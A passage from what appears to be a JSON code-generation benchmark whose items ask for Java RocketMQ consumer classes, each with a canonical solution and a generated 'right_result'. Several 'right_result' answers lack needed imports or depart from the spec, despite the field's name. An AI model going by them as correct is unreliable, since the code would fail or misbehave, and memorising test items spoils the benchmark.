    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class PushConsumer {\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) throws Exception {\n        this.consumer = new DefaultMQPushConsumer(consumerGroup);\n        this.consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        this.consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        this.consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws Exception {\n        this.consumer.start();\n    }\n\n    public void shutdown() {\n        this.consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n            for (MessageExt msg : msgs) {\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 370,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to subscribe to messages from a specified topic, process them using an orderly message listener, and manage the consumer lifecycle.\n\nClass Description: The Consumer class encapsulates the functionality of a RocketMQ push consumer that subscribes to a topic, processes messages in order, and provides methods to start and stop the consumer.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance\n- consumerGroup: String - The consumer group name for this consumer\n- topic: String - The topic to subscribe to\n- subExpression: String - The tag expression for message filtering\n\nMethods:\n- Consumer(String, String, String) -> None - Constructor that initializes the consumer group, topic, and subscription expression\n- initialize() -> None - Initializes the consumer instance with basic configuration and subscription\n- start() -> None - Registers the message listener and starts the consumer\n- shutdown() -> None - Gracefully shuts down the consumer",
    "Canonical_solution": "import java.util.List;\nimport java.util.concurrent.atomic.AtomicLong;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerOrderly;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\npublic class Consumer {\n\n    private DefaultMQPushConsumer consumer;\n    private String consumerGroup;\n    private String topic;\n    private String subExpression;\n\n    public Consumer(String consumerGroup, String topic, String subExpression) {\n        this.consumerGroup = consumerGroup;\n        this.topic = topic;\n        this.subExpression = subExpression;\n    }\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void start() throws MQClientException {\n        consumer.registerMessageListener(new MessageListenerOrderly() {\n            AtomicLong consumeTimes = new AtomicLong(0);\n\n            @Override\n            public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {\n                context.setAutoCommit(true);\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n                this.consumeTimes.incrementAndGet();\n                if ((this.consumeTimes.get() % 2) == 0) {\n                    return ConsumeOrderlyStatus.SUCCESS;\n                } else if ((this.consumeTimes.get() % 5) == 0) {\n                    context.setSuspendCurrentQueueTimeMillis(3000);\n                    return ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;\n                }\n                return ConsumeOrderlyStatus.SUCCESS;\n            }\n        });\n        consumer.start();\n        System.out.printf(\"Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class Consumer {\n    private DefaultMQPushConsumer consumer;\n    private String consumerGroup;\n    private String topic;\n    private String subExpression;\n\n    public Consumer(String consumerGroup, String topic, String subExpression) {\n        this.consumerGroup = consumerGroup;\n        this.topic = topic;\n        this.subExpression = subExpression;\n    }\n\n    public void initialize() throws Exception {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(\"localhost:9876\");\n        consumer.subscribe(topic, subExpression);\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                // Process each message here\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    public void start() throws Exception {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 371,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ ordered message consumer using the DefaultMQPushConsumer for push-based message consumption with ordered message processing.\n\nClass Description: The RocketMQOrderedConsumer class provides functionality to consume messages from RocketMQ in an ordered manner. It handles consumer initialization, topic subscription, message listening, and consumer lifecycle management. The class includes an inner class for ordered message processing.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The main consumer instance that handles message consumption from RocketMQ\n\nMethods:\n- RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) -> void - Constructor that initializes the consumer with NameServer address and consumer group\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerOrderly listener) -> void - Registers an ordered message listener for processing incoming messages\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully\n\nInner Class:\n- OrderedMessageListener: MessageListenerOrderly - Implements ordered message processing logic with consumeMessage method\n  - consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) -> ConsumeOrderlyStatus - Processes a batch of messages and returns consumption status",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerOrderly;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class RocketMQOrderedConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerOrderly listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class OrderedMessageListener implements MessageListenerOrderly {\n        @Override\n        public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {\n            System.out.printf(System.currentTimeMillis() + \",\" + Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeOrderlyStatus.SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeOrderlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerOrderly;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class RocketMQOrderedConsumer {\n    private DefaultMQPushConsumer consumer;\n\n    public RocketMQOrderedConsumer(String namesrvAddr, String consumerGroup) {\n        this.consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerOrderly listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws Exception {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class OrderedMessageListener implements MessageListenerOrderly {\n        @Override\n        public ConsumeOrderlyStatus consumeMessage(List<MessageExt> msgs, ConsumeOrderlyContext context) {\n            // Implement ordered message processing logic here\n            return ConsumeOrderlyStatus.SUCCESS;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 372,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously process messages from a specified topic, handling message consumption with retry logic for failed messages.\n\nClass Description: The PlanConsumer class is a Spring component that initializes and manages a RocketMQ push consumer. It subscribes to a specific topic, processes incoming messages, and implements retry logic for failed message consumption. The consumer is configured to start automatically after bean initialization.\n\nAttributes:\n- consumerGroup: String - The consumer group name for the RocketMQ consumer, injected from properties\n- namesrvAddr: String - The NameServer address for RocketMQ, injected from properties\n- logger: Logger - SLF4J logger instance for logging messages and errors\n\nMethods:\n- defaultMQPushConsumer(): void - Initializes and starts the RocketMQ consumer. This method is automatically called after bean construction (@PostConstruct). It:\n  1. Creates a DefaultMQPushConsumer instance\n  2. Configures NameServer address\n  3. Subscribes to the specified topic with wildcard tag filter\n  4. Sets consumption offset strategy\n  5. Registers a concurrent message listener\n  6. Starts the consumer\n  The message listener processes messages, logs successful consumption, and implements retry logic (up to 3 attempts) for failed messages.\n\nInput: None (Configuration is injected via @Value annotations)\n\nOutput: None (The consumer runs continuously, processing messages as they arrive)",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport top.lrshuai.mq.comment.Const;\nimport top.lrshuai.mq.test.entity.AccountPlan;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class PlanConsumer {\n\n    @Value(\"${apache.rocketmq.consumer.PushConsumer}\")\n    private String consumerGroup;\n\n    @Value(\"${apache.rocketmq.namesrvAddr}\")\n    private String namesrvAddr;\n\n    private Logger logger = LoggerFactory.getLogger(this.getClass());\n\n    @PostConstruct\n    public void defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        try {\n            consumer.subscribe(Const.PLAN_TOPIC, \"*\");\n            consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n            consumer.registerMessageListener((MessageListenerConcurrently) (list, context) -> {\n                MessageExt tempMsg = null;\n                try {\n                    for (MessageExt msg : list) {\n                        tempMsg = msg;\n                        String messageBody = new String(msg.getBody(), \"utf-8\");\n                        AccountPlan plan = JSON.parseObject(messageBody, AccountPlan.class);\n                        logger.info(\"\u6d88\u8d39\u6210\u529f\uff1amsgId={}\uff0cplan={}\", msg.getMsgId(), plan);\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                    if(tempMsg.getReconsumeTimes() == 3) {\n                        logger.error(\"msg consume error by:{}\", tempMsg);\n                        return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                    }\n                    return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            });\n            consumer.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class PlanConsumer {\n\n    private final Logger logger = LoggerFactory.getLogger(PlanConsumer.class);\n\n    @Value(\"${rocketmq.consumer.group}\")\n    private String consumerGroup;\n\n    @Value(\"${rocketmq.namesrv.addr}\")\n    private String namesrvAddr;\n\n    @PostConstruct\n    public void defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        try {\n            consumer.subscribe(\"your_topic\", \"*\");\n            consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n            consumer.registerMessageListener(new MessageListenerConcurrently() {\n                @Override\n                public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                    int retryCount = 0;\n                    while (retryCount < 3) {\n                        try {\n                            // Process message\n                            logger.info(\"Consuming message: {}\", msgs.get(0));\n                            // Simulate message processing\n                            Thread.sleep(1000);\n                            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n                        } catch (Exception e) {\n                            logger.error(\"Failed to consume message: {}, retry count: {}\", msgs.get(0), retryCount, e);\n                            retryCount++;\n                        }\n                    }\n                    return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n                }\n            });\n            consumer.start();\n            logger.info(\"RocketMQ consumer started.\");\n        } catch (Exception e) {\n            logger.error(\"Error initializing RocketMQ consumer.\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 373,
    "Instruction": "Task Description: Create a Java class that configures and initializes a RocketMQ push consumer with specific settings for message consumption, including topic subscription and message listener registration.\n\nClass Description: The `AliyunMqConfiguration` class is a Spring configuration class that sets up a RocketMQ push consumer (`DefaultMQPushConsumer`). It configures the consumer with NameServer address, consumption strategy, topic subscriptions with tags, and registers a message listener. The consumer is started asynchronously after a delay.\n\nAttributes:\n- `paascloudProperties`: [PaascloudProperties] - Contains configuration properties for the RocketMQ consumer, including NameServer address and consumer group.\n- `optPushConsumer`: [OptPushMessageListener] - The message listener implementation that handles incoming messages.\n- `taskExecutor`: [TaskExecutor] - Executor service used to start the consumer asynchronously.\n\nMethods:\n- `defaultMQPushConsumer()`: [None] -> [DefaultMQPushConsumer] - Configures and initializes the RocketMQ push consumer. Sets the NameServer address, consumption strategy, subscribes to topics with tags, registers the message listener, and starts the consumer asynchronously after a delay. Throws `MQClientException` if there's an error in consumer configuration.\n\nThe class follows Spring's dependency injection pattern and uses `@Bean` to expose the consumer instance to the Spring context. The consumer is started in a separate thread to avoid blocking the main application startup.",
    "Canonical_solution": "import com.paascloud.PublicUtil;\nimport com.paascloud.base.constant.AliyunMqTopicConstants;\nimport com.paascloud.base.constant.GlobalConstant;\nimport com.paascloud.config.properties.PaascloudProperties;\nimport com.paascloud.provider.consumer.listener.OptPushMessageListener;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.core.task.TaskExecutor;\n\nimport javax.annotation.Resource;\n\n@Configuration\npublic class AliyunMqConfiguration {\n\n    @Resource\n    private PaascloudProperties paascloudProperties;\n\n    @Resource\n    private OptPushMessageListener optPushConsumer;\n\n    @Resource\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getAliyun().getRocketMq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getAliyun().getRocketMq().getNamesrvAddr());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        String[] strArray = AliyunMqTopicConstants.ConsumerTopics.OPT.split(GlobalConstant.Symbol.COMMA);\n        for (String aStrArray : strArray) {\n            String[] topicArray = aStrArray.split(GlobalConstant.Symbol.AT);\n            String topic = topicArray[0];\n            String tags = topicArray[1];\n            if (PublicUtil.isEmpty(tags)) {\n                tags = \"*\";\n            }\n            consumer.subscribe(topic, tags);\n        }\n\n        consumer.registerMessageListener(optPushConsumer);\n        consumer.setConsumeThreadMax(2);\n        consumer.setConsumeThreadMin(2);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                e.printStackTrace();\n            }\n        });\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;\n\nimport java.util.List;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.TimeUnit;\n\n@Configuration\npublic class AliyunMqConfiguration {\n\n    @Autowired\n    private PaascloudProperties paascloudProperties;\n\n    @Autowired\n    private OptPushMessageListener optPushConsumer;\n\n    @Autowired\n    private ThreadPoolTaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getNameServerAddress());\n\n        // Set consumption strategy\n        consumer.setMessageModel(MessageModel.CLUSTERING);\n\n        // Subscribe to topics with tags\n        consumer.subscribe(\"TopicTest\", \"*\");\n\n        // Register message listener\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n\n        // Start consumer asynchronously after a delay\n        taskExecutor.execute(() -> {\n            try {\n                TimeUnit.SECONDS.sleep(5);\n                consumer.start();\n                System.out.println(\"Consumer Started.\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n\n        return consumer;\n    }\n}\n```"
  },
  {
    "Task_id": 375,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer with Spring integration capabilities, allowing for configuration through properties and proper lifecycle management.\n\nClass Description: The Consumer class is a Spring FactoryBean that creates and manages a RocketMQ DefaultMQPushConsumer instance. It implements InitializingBean for initialization and DisposableBean for cleanup, providing a convenient way to integrate RocketMQ consumers into Spring applications. The class offers extensive configuration options for consumer behavior and performance tuning.\n\nAttributes:\n\nconsumerGroup: String - The consumer group name for this consumer\nnamesrvAddr: String - The address of the NameServer\ninstanceName: String - The instance name for this consumer\nmessageModel: MessageModel - The message model (CLUSTERING or BROADCASTING)\nconsumeThreadMin: int - Minimum thread pool size for message consumption\nconsumeThreadMax: int - Maximum thread pool size for message consumption\npullThresholdForQueue: int - Flow control threshold for queue\npullThresholdSizeForQueue: int - Flow control threshold for queue size\nconsumeMessageBatchMaxSize: int - Maximum number of messages consumed in one batch\npullBatchSize: int - Maximum number of messages pulled in one batch\nmaxReconsumeTimes: int - Maximum number of retry attempts\nconsumeTimeout: long - Timeout for message consumption\ntopic: String - The topic to subscribe to\ntags: String - The tag filter for subscribed messages\nmessageListener: MessageListenerConcurrently - The listener for processing received messages\nconsumer: DefaultMQPushConsumer - The actual RocketMQ consumer instance\n\nMethods:\n\nafterPropertiesSet(): void - Initializes and starts the consumer after properties are set (from InitializingBean)\ndestroy(): void - Shuts down the consumer when the Spring context is destroyed (from DisposableBean)\ngetObject(): DefaultMQPushConsumer - Returns the consumer instance (from FactoryBean)\ngetObjectType(): Class<?> - Returns the consumer class type (from FactoryBean)\nisSingleton(): boolean - Indicates this is a singleton bean (from FactoryBean)\nsetConsumerGroup(String): void - Sets the consumer group name\nsetNamesrvAddr(String): void - Sets the NameServer address\nsetInstanceName(String): void - Sets the instance name\nsetMessageModel(String): void - Sets the message model\nsetConsumeThreadMin(int): void - Sets minimum consumption threads\nsetConsumeThreadMax(int): void - Sets maximum consumption threads\nsetPullThresholdForQueue(int): void - Sets queue flow control threshold\nsetPullThresholdSizeForQueue(int): void - Sets queue size flow control threshold\nsetConsumeMessageBatchMaxSize(int): void - Sets batch consumption size\nsetPullBatchSize(int): void - Sets pull batch size\nsetMaxReconsumeTimes(int): void - Sets maximum retry attempts\nsetConsumeTimeout(long): void - Sets consumption timeout\nsetTopic(String): void - Sets subscription topic\nsetTags(String): void - Sets message tag filter\nsetMessageListener(MessageListenerConcurrently): void - Sets the message listener",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\nimport org.springframework.beans.factory.DisposableBean;\nimport org.springframework.beans.factory.FactoryBean;\nimport org.springframework.beans.factory.InitializingBean;\n\npublic class Consumer implements FactoryBean<DefaultMQPushConsumer>, InitializingBean, DisposableBean {\n\n    private DefaultMQPushConsumer consumer;\n\n    private String consumerGroup;\n    private String namesrvAddr;\n    private String instanceName;\n    private MessageModel messageModel = MessageModel.CLUSTERING;\n    private int consumeThreadMin = 20;\n    private int consumeThreadMax = 64;\n    private int pullThresholdForQueue = 1000;\n    private int pullThresholdSizeForQueue = 100;\n    private int consumeMessageBatchMaxSize = 1;\n    private int pullBatchSize = 32;\n    private int maxReconsumeTimes = -1;\n    private long consumeTimeout = 15;\n    private String topic;\n    private String tags;\n    private MessageListenerConcurrently messageListener;\n\n    @Override\n    public void afterPropertiesSet() throws Exception {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setInstanceName(instanceName);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setMessageModel(messageModel);\n        consumer.setConsumeThreadMin(consumeThreadMin);\n        consumer.setConsumeThreadMax(consumeThreadMax);\n        consumer.setPullThresholdForQueue(pullThresholdForQueue);\n        consumer.setPullThresholdSizeForQueue(pullThresholdSizeForQueue);\n        consumer.setConsumeMessageBatchMaxSize(consumeMessageBatchMaxSize);\n        consumer.setPullBatchSize(pullBatchSize);\n        consumer.setMaxReconsumeTimes(maxReconsumeTimes);\n        consumer.setConsumeTimeout(consumeTimeout);\n        consumer.subscribe(topic, tags);\n        consumer.registerMessageListener(messageListener);\n        consumer.start();\n    }\n\n    @Override\n    public void destroy() throws Exception {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n\n    @Override\n    public DefaultMQPushConsumer getObject() throws Exception {\n        return consumer;\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return DefaultMQPushConsumer.class;\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n\n    public void setConsumerGroup(String consumerGroup) {\n        this.consumerGroup = consumerGroup;\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void setInstanceName(String instanceName) {\n        this.instanceName = instanceName;\n    }\n\n    public void setMessageModel(String messageModel) {\n        this.messageModel = MessageModel.valueOf(messageModel);\n    }\n\n    public void setConsumeThreadMin(int consumeThreadMin) {\n        this.consumeThreadMin = consumeThreadMin;\n    }\n\n    public void setConsumeThreadMax(int consumeThreadMax) {\n        this.consumeThreadMax = consumeThreadMax;\n    }\n\n    public void setPullThresholdForQueue(int pullThresholdForQueue) {\n        this.pullThresholdForQueue = pullThresholdForQueue;\n    }\n\n    public void setPullThresholdSizeForQueue(int pullThresholdSizeForQueue) {\n        this.pullThresholdSizeForQueue = pullThresholdSizeForQueue;\n    }\n\n    public void setConsumeMessageBatchMaxSize(int consumeMessageBatchMaxSize) {\n        this.consumeMessageBatchMaxSize = consumeMessageBatchMaxSize;\n    }\n\n    public void setPullBatchSize(int pullBatchSize) {\n        this.pullBatchSize = pullBatchSize;\n    }\n\n    public void setMaxReconsumeTimes(int maxReconsumeTimes) {\n        this.maxReconsumeTimes = maxReconsumeTimes;\n    }\n\n    public void setConsumeTimeout(long consumeTimeout) {\n        this.consumeTimeout = consumeTimeout;\n    }\n\n    public void setTopic(String topic) {\n        this.topic = topic;\n    }\n\n    public void setTags(String tags) {\n        this.tags = tags;\n    }\n\n    public void setMessageListener(MessageListenerConcurrently messageListener) {\n        this.messageListener = messageListener;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.springframework.beans.factory.FactoryBean;\nimport org.springframework.beans.factory.InitializingBean;\nimport org.springframework.beans.factory.DisposableBean;\n\nimport java.util.List;\n\npublic class RocketMQPushConsumerFactoryBean implements FactoryBean<DefaultMQPushConsumer>, InitializingBean, DisposableBean {\n\n    private String consumerGroup;\n    private String namesrvAddr;\n    private String instanceName;\n    private String messageModel;\n    private int consumeThreadMin;\n    private int consumeThreadMax;\n    private int pullThresholdForQueue;\n    private int pullThresholdSizeForQueue;\n    private int consumeMessageBatchMaxSize;\n    private int pullBatchSize;\n    private int maxReconsumeTimes;\n    private long consumeTimeout;\n    private String topic;\n    private String tags;\n    private MessageListenerConcurrently messageListener;\n    private DefaultMQPushConsumer consumer;\n\n    @Override\n    public void afterPropertiesSet() throws Exception {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        if (instanceName != null) {\n            consumer.setInstanceName(instanceName);\n        }\n        consumer.setMessageModel(MessageModel.valueOf(messageModel));\n        consumer.setConsumeThreadMin(consumeThreadMin);\n        consumer.setConsumeThreadMax(consumeThreadMax);\n        consumer.setPullThresholdForQueue(pullThresholdForQueue);\n        consumer.setPullThresholdSizeForQueue(pullThresholdSizeForQueue);\n        consumer.setMaxReconsumeTimes(maxReconsumeTimes);\n        consumer.setConsumeTimeout(consumeTimeout);\n\n        if (tags != null && !tags.isEmpty()) {\n            consumer.subscribe(topic + \":\" + tags, \"*\");\n        } else {\n            consumer.subscribe(topic, \"*\");\n        }\n\n        consumer.registerMessageListener((List<MessageExt> msgs, ConsumeConcurrentlyContext context) -> {\n            for (MessageExt msg : msgs) {\n                // Process each message\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n\n        consumer.start();\n    }\n\n    @Override\n    public void destroy() throws Exception {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n\n    @Override\n    public DefaultMQPushConsumer getObject() throws Exception {\n        return consumer;\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return DefaultMQPushConsumer.class;\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n\n    public void setConsumerGroup(String consumerGroup) {\n        this.consumerGroup = consumerGroup;\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void setInstanceName(String instanceName) {\n        this.instanceName = instanceName;\n    }\n\n    public void setMessageModel(String messageModel) {\n        this.messageModel = messageModel;\n    }\n\n    public void setConsumeThreadMin(int consumeThreadMin) {\n        this.consumeThreadMin = consumeThreadMin;\n    }\n\n    public void setConsumeThreadMax(int consumeThreadMax) {\n        this.consumeThreadMax = consumeThreadMax;\n    }\n\n    public void setPullThresholdForQueue(int pullThresholdForQueue) {\n        this.pullThresholdForQueue = pullThresholdForQueue;\n    }\n\n    public void setPullThresholdSizeForQueue(int pullThresholdSizeForQueue) {\n        this.pullThresholdSizeForQueue = 